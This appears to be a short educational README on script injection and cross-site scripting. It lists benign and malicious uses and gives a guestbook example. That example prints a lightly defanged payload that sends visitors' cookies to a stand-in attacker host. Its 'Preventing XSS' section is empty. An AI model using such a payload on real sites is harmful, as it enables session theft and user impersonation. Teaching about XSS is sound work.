# Script Injection

# What?
* Code injection in general is when some code is placed (injected) into a vulnerable program.

* Much like a injecting drugs, this will have a serious effect - and this won't always be a good thing. Like injecting a local anesthetic to allow a friendly operation on your teeth :


![](http://weknowyourdreamz.com/images/teeth/teeth-01.jpg)


or a hard class A that will lead to a life of theft and no teeth, ![no teeth](http://4.bp.blogspot.com/_B1LlYh6iKqs/TLD7j0p2rsI/AAAAAAAAC-Y/CwVAtJA8MmA/s1600/rotten-teeth-6.jpg)

there are benign and malign code injections.

### Benign
* Introduce a useful new column that did not appear in the original design of a search results page.

* Offer a new way to filter, order, or group data by using a
field not exposed in the default functions of the original design.

* As with programs like Dropbox, add special parts that could be used to connect to online resources in an offline program.




### Malign

* Often disastrous!

* Change, add, or remove internal code with a possibility of doing anything.

* Steal cookies - data, passwords, session IDs etc.

* Used to set up elaborate fishing scams.

* Could even be used to propagate a worm, which could entirely destroy all the code.



# How?

* A web server has a guestbook script, which accepts small messages from users, and typically receives messages such as

--- Very nice site!

However a malicious person may know of a code injection vulnerability in the guestbook, and enters a message such as (the ## are in place of < as READme files will also ignore script tags!)

Nice site,  I think I'll take it.

--- ##script> document.location="http://some_attacker/cookie.cgi?" + document.cookie ##close/script>

If another user views the page then the injected code will be executed. This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.


# Preventing XSS




## References

* [XSS article](http://www.thegeekstuff.com/2012/02/xss-attack-examples/)
* [video on cross scripting](https://www.youtube.com/watch?v=OVLz6RgOjIY)
* [video on cross scripting](https://www.youtube.com/watch?v=V79Dp7i4LRM)
* [Further articles on code injection](https://en.wikipedia.org/wiki/Code_injection)
* [Article on prevention](https://www.owasp.org/index.php/XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet#HTML_entity_encoding )
